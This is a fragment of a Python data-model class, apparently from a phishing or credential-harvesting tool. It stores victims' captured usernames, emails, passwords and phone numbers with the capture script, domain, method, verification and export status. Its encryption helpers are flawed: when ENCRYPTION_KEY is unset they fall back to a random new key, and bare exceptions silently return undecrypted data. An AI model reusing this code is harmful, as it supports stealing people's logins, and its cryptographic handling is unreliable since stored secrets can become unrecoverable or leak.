        """Descriptografa um campo sensível"""
        if not encrypted_value:
            return None
        try:
            from cryptography.fernet import Fernet
            import os
            
            key = os.environ.get('ENCRYPTION_KEY', Fernet.generate_key())
            if isinstance(key, str):
                key = key.encode()
            
            f = Fernet(key)
            return f.decrypt(encrypted_value.encode()).decode()
        except:
            return encrypted_value  # Fallback

    def set_username(self, value):
        """Define username criptografado"""
        self.username = self.encrypt_field(value)

    def get_username(self, anonymize=False):
        """Obtém username descriptografado"""
        if anonymize:
            return "user_***"
        return self.decrypt_field(self.username)

    def set_email(self, value):
        """Define email criptografado"""
        self.email = self.encrypt_field(value)

    def get_email(self, anonymize=False):
        """Obtém email descriptografado"""
        if anonymize:
            decrypted = self.decrypt_field(self.email)
            if decrypted and '@' in decrypted:
                parts = decrypted.split('@')
                return f"{parts[0][:2]}***@{parts[1]}"
            return "***@***.com"
        return self.decrypt_field(self.email)

    def set_password(self, value):
        """Define password criptografado"""
        self.password = self.encrypt_field(value)

    def get_password(self, anonymize=False):
        """Obtém password descriptografado"""
        if anonymize:
            return "***"
        return self.decrypt_field(self.password)

    def set_phone(self, value):
        """Define phone criptografado"""
        self.phone = self.encrypt_field(value)

    def get_phone(self, anonymize=False):
        """Obtém phone descriptografado"""
        if anonymize:
            return "***-***-****"
        return self.decrypt_field(self.phone)

    def anonymize(self):
        """Marca como anonimizado"""
        self.is_anonymized = True

    def get_field_names(self):
        """Retorna nomes dos campos como lista"""
        if self.field_names:
            try:
                return json.loads(self.field_names)
            except:
                return []
        return []

    def set_field_names(self, names_list):
        """Define nomes dos campos"""
        self.field_names = json.dumps(names_list) if names_list else None

    def get_form_data(self):
        """Retorna dados extras do formulário"""
        if self.form_data:
            try:
                return json.loads(self.form_data)
            except:
                return {}
        return {}

    def set_form_data(self, data_dict):
        """Define dados extras do formulário"""
        self.form_data = json.dumps(data_dict) if data_dict else None

    def to_dict(self, anonymize=False, include_sensitive=True):
        """Converte para dicionário"""
        result = {
            'id': self.id,
            'visitor_id': self.visitor_id,
            'generated_url_id': self.generated_url_id,
            'user_id': self.user_id,
            'script_name': self.script_name,
            'domain_used': self.domain_used,
            'capture_method': self.capture_method,
            'is_verified': self.is_verified,
            'is_anonymized': self.is_anonymized,
            'is_exported': self.is_exported,
            'captured_at': self.captured_at.isoformat() if self.captured_at else None,
            'verified_at': self.verified_at.isoformat() if self.verified_at else None,
            'exported_at': self.exported_at.isoformat() if self.exported_at else None,
            'field_names': self.get_field_names(),
            'form_data': self.get_form_data()
        }
        
        if include_sensitive:
            result.update({
                'username': self.get_username(anonymize),
                'email': self.get_email(anonymize),
                'password': self.get_password(anonymize),
                'phone': self.get_phone(anonymize)
            })
        
        return result

    def __repr__(self):
        return f'<CapturedCredential {self.id} - {self.script_name}>'

